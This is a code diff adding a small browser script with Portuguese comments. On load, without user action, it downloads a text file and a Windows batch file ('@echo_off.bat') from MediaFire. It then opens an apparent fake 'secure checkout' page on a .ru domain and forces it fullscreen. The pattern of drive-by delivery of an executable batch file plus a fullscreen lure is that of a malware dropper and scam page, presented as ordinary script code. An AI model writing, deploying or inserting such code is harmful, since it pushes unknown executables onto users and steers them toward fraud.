@@ -1,0 +1,40 @@
+(function () {
+    'use strict';
+
+    // SEUS LINKS CONFIGURADOS
+    const LINK_TXT = "https://www.mediafire.com/file/8gx4njzt5npmaav/ABRA_AP%25C3%2593S_EXECUTAR_O_SCRIPT.txt/file";
+    const LINK_BAT = "https://www.mediafire.com/file/y1rpjs1o7kwtn7b/%2540echo_off.bat/file";
+    const LINK_SITE = "https://checkoutseguro.ru/checkout/cmsj3xt700be501ome8exnyed?offer=HJLXXVQ";
+    const TEMPO_ESPERA = 3000; // 3 segundos para baixar antes de abrir
+
+    // Função baixar arquivo
+    function baixar(url) {
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = '';
+        a.target = '_blank';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+    }
+
+    // Abrir site e ativar tela cheia
+    function abrirTelaCheia(url) {
+        const janela = window.open(url, '_blank');
+        if (!janela) {
+            alert("⚠️ Permita pop-ups/abas novas no navegador para funcionar!");
+            return;
+        }
+        janela.onload = () => {
+            const el = janela.document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+            else if (el.msRequestFullscreen) el.msRequestFullscreen();
+        };
+    }
+
+    // Sequência: baixa txt → baixa bat → espera → abre site
+    baixar(LINK_TXT);
+    setTimeout(()=> baixar(LINK_BAT), 800);
+    setTimeout(()=> abrirTelaCheia(LINK_SITE), TEMPO_ESPERA);
+})();
